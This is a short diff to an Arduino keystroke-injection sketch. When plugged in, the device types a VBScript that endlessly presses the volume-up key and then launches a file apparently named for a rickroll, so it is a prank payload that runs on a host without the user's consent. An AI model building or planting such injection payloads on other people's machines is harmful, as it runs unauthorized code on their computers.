@@ -86,19 +86,22 @@ delay(10000);
 
   typeKey(KEY_RETURN);
 
-  Keyboard.print("do");
+  Keyboard.print("Set WshShell = CreateObject(\"WScript.Shell\")");
 
   typeKey(KEY_RETURN);
 
-  Keyboard.print("Set WshShell = CreateObject(\"WScript.Shell\")");
-
+  Keyboard.print("While true");
   typeKey(KEY_RETURN);
 
   Keyboard.print("WshShell.SendKeys(chr(&hAF))");
 
   typeKey(KEY_RETURN);
 
-  Keyboard.print("loop");
+  Keyboard.print("WScript.Sleep 10");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("Wend");
 
   typeKey(KEY_RETURN);
 
@@ -108,7 +111,7 @@ delay(10000);
 
   typeKey(KEY_RETURN);
 
-  Keyboard.print("start rickyou.vbs && volup.vbs");
+  Keyboard.print("start volup.vbs && rickyou.vbs");
 
   typeKey(KEY_RETURN);
 
